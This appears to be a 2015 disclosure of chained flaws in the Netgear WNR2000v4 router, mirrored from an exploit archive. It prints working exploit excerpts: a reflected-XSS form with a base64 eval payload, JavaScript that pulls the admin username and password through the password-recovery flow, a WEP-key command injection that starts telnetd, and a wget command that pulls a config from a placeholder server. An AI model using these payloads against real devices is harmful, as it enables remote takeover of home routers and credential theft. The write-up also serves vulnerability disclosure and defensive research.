@@ -1,0 +1,215 @@
+id: 23563
+date: 04/23/2015
+title: Netgear WNR2000v4 Abuse / XSS / Command Injection Vulnerabilities
+author: endeavor
+cves: 
+
+I'm releasing a few vulnerabilities for the WNR2000v4 Netgear router.
+Netgear is currently working these issues.
+
+Quick Fix
+---------
+
+If you own a WNR2000v4, set a strong password and set security questions
+to jibberish.
+
+Timeline
+--------
+
+   FEB2015 - "MW" Volunteers to be victim to router pwning games.
+ 06MAR2015 - WNR2000v4 Arrives
+ 12MAR2015 - Exploit complete
+ 13MAR2015 - Exploit demoed
+~01APR2015 - MW switches to DD-WRT firmware.
+ 14APR2015 - Initial report to Netgear.
+             Inform Netgear will release details on 21APR2015.
+ 18APR2015 - Ask for update.
+             Will be notified when there's an update from support.
+ 20APR2015 - Ask for update.
+ 20APR2015 - Netgear confirms vulnerability. Says risk is only from
+             LAN side. Recommend securing LAN side and using secure
+             wireless password. Netgear apparently working on a fix.
+ 20APR2015 - Respond to Netgear. Offer to withhold details as they are
+             working on a fix. Indicate will not release until after
+             5pm EST on 21APR2015 awaiting their response.
+ 21APR2015 - No response. Details released.
+ 30APR2015 - Demo at AHA?
+
+No exploit provided
+-------------------
+
+An exploit is not provided with this report as Netgear is still working
+the issue. However, a working exploit exists and excerpts from it are
+used to explain the vulnerabilities. With a WNR200v4 on hand and these
+notes, you could probably piece something together in a few hours.
+
+If I know you, and I like you, and you ask for the exploit for
+non-malicious purposes, I'll send it (along with a better writeup).
+
+Vulnerabilities
+---------------
+
+WNR2000v4 is suspect to a few vulnerabilities. We will concern ourselves
+with three vulnerabilities:
+
+1) Reflected XSS to execute javascript from origin of the http admin
+interface.
+2) Abuse password recovery feature to retrieve auth details.
+3) Exploit a command injection vulnerability in setting WEP passwords
+for code execution on the device.
+
+When combined, these vulnerabilities allow an attacker to leverage RCE
+against the WNR2000v4 by causing the victim to visit an
+attacker-controlled web page. The attacker-controlled web page can be
+located outside of the LAN.
+
+To Illustrate:
+
+Victim <--LAN--> WNR20000v4 <--WAN--> Attacker
+
+Reflected XSS
+-------------
+
+I apologize for the text-mangling. This XSS vulnerability is best shown
+in an HTML form which, when submitted, executes base64-encoded
+javascript from the origin of the WNR2000v4's admin panel.
+
+<form action='HOST/apply_noauth.cgi?/"' method="post" id="form">
+<input type="hidden" name="submit_flag" value="security_question" />
+<input type="hidden" name="answer1"
+   value='javascript:{eval(window.atob("BASE64"));}//\\";
+window.location=last_error_ans1;answer_again=0;//' />
+<input type="hidden" name="answer2" value="" />
+<input type="submit" value="submit" />
+</form>
+
+Where HOST is the internal address of the router, IE: 192.168.1.1 in the
+vast majority of configurations.
+
+Remember, CORS doesn't apply to form submissions. This HTML, anywhere
+(like WAN), paired with the javascript
+document.getElementById("form").submit();
+gets the ball rolling automagically.
+
+Recovering Auth Credentials
+---------------------------
+
+Recovering auth credentials requires:
+ 1) Serial number to the device.
+ 2) Correctly answering security questions.
+
+Submitting a correct serial number will set a flag. Submitting correct
+security questions will set a second flag. Once both flags are set and
+passwordrecovered.cgi is fetched the auth credentials will be returned.
+
+The serial number of the device is available in the result of the
+unauthenticated request to:
+
+http://HOST/BRS_netgear_success.html
+
+If the option to use security questions is not used, and security
+questions are never set, the security questions are the empty string.
+
+A series of requests to fetch auth credentials may look like the following:
+
+var r = httpGet(makeUrl(HOST, "/BRS_netgear_success.html"));
+var re = new RegExp("var sn=\"(.*)\"");
+var serialnumber = re.exec(r)[1];
+document.body.innerHTML += serialnumber + '<br>';
+
+var data = "submit_flag=match_sn&serial_num=" + serialnumber;
+var r = httpPost(makeUrl(HOST, "/apply_noauth.cgi?/a"), data);
+
+var data = "submit_flag=security_question&answer1=&answer2="
+var r = httpPost(makeUrl(HOST, "/apply_noauth.cgi?/a"), data);
+
+var response = httpGet(makeUrl(TARGET_HOST, "/passwordrecovered.cgi"));
+var re = new RegExp("Admin Username: (.*)</TD>");
+var username = re.exec(response)[1];
+var re = new RegExp("Admin Password: (.*)</TD>");
+var password = htmlDesanitize(re.exec(response)[1]);
+
+document.body.innerHTML += 'username: ' + username + '<br>';
+document.body.innerHTML += 'password: ' + password + '<br>';
+
+Command injection through WEP password
+--------------------------------------
+
+In order to perform command injection for the WEP password, we must
+retrieve a CSRF token called, "timestamp." This token is appropriately
+named. Guessing the correct timestamp would be annoying, hence we obtain
+auth credentials and retrieve it. I'll skip the implementation details
+on timestamp for brevity.
+
+var r = httpGetAuth(makeUrl(HOST, "/WLG_wireless.htm"), user, pass);
+
+var re = new RegExp("timestamp=(.*)\"");
+var timestamp = re.exec(response)[1];
+
+Once we have timestamp, we prepare a POST request full of many wonderful
+fields:
+
+// this will start telnet, and is a lame, but publicly acceptable
+// example.
+var commandinject = '/usr/sbin/telnetd';
+
+var request =
+"submit_flag=wlan&Apply=Apply&hidden_wlan_mode=&hidden_wlan_channel=&generate_flag=0&old_length=13&wl_sec_wpaphrase_len=&wl_hidden_wpa_psk=&hidden_sec_type=&wep_press_flag=0&wpa1_press_flag=0&wpa2_press_flag=0&wpas_press_flag=0&wps_change_flag=5&hidden_enable_guestNet=&hidden_enable_ssidbro=&hidden_allow_guest=&radiusServerIP=&opmode_bg=&wl_mode=&wl_ssid=NETGEAR44&wl_WRegion=4&wl_hidden_wlan_channel=1&wl_hidden_wlan_mode=1&wl_hidden_sec_type=2&hidden_WpaeRadiusSecret=&hidden_WpaeRadiusSecret_a=&wl_enable_ssid_broadcast=1&hidden_enable_video=&wl_tx_ctrl=&wl_apply_flag=1&ssid_bc=1&ssid=NETGEAR44&wla1ssid=NETGEAR-5G_Guest1&wlg1ssid=NETGEAR-Guest&WRegion=4&w_channel=1&opmode=1&opmode54=1&security_type=WEP&authAlgm=2&wepenc=13&wep_key_no=1&KEY1=;"
++ commandinject + ";&KEY2=&KEY3=&KEY4=";
+
+httpPostAuth(makeUrl(TARGET_HOST,
+       '/apply_noauth.cgi?/WLG_wireless.htm timestamp=' + timestamp),
+       request,
+       username,
+       password);
+
+Notes
+-----
+
+This will, of course, overwrite and destroy any wireless settings on the
+router. It will be *noticeable*.
+
+Once you are authed against the admin interface, you can open the admin
+interface to the wonderful internet. You can then pull the router
+configuration out. If you decide to do more than start telnet, you
+should also pull the configuration back down, restore it, the restart
+wireless with something like this:
+
+wget -T 10 -O /tmp/config http://some.server/config;
+sleep 10;
+config restore /tmp/config;
+wlan down;
+wlan up;
+
+Remember to turn off the public-facing admin interface when complete.
+
+In Conclusion
+-------------
+
+This was my first time hacking router firmware, or any embedded firmware
+for that matter. It's great fun, and I highly encourage it. For those
+tired of the endless slog of CTFs, give firmware a try!
+
+Thanks to MW for being a good sport until he switched firmwares, and
+devttys0 for binwalk.
+
+Vendors of Devices
+------------------
+
+Please establish some formal way for people to report vulnerabilities to
+you, and some way for the people working those vulnerabilities to
+respond back to those who report. Even if you don't want to pay for the
+vulnerabilities, at a minimum set up some way for those with
+vulnerabilities to communicate with a security team. Customer support is
+not a good, nor appropriate, way to do this.
+
+This will strongly influence the devices I purchase in the future, and
+the devices I recommend to others.
+
+That's all!
+-----------
+
+Thanks for reading,
+- endeavor
+
+#  0day.today [2023-03-23]  #
